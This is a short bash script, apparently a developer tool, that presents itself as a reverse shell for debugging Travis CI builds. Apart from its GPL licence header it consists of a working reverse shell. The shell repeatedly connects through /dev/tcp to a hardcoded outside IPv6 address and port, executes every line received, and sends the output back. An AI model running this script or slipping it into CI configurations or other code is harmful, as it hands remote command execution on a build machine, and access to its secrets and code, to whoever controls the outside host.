#!/bin/bash
#
#   Travis-CI-reverse-shell is a reverse shell useful for TravisCI debug.
#   
#   Copyright (C) 2014 evilaliv3 <giovanni.pellerano@evilaliv3.org>
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


IP=2001:1418:100:250::2
PORT=12345

while((1)); do
  if exec 5<>/dev/tcp/${IP}/${PORT}; then
    cat <&5 | while read line; do $line 2>&5 >&5; done
  fi
  sleep 10
done
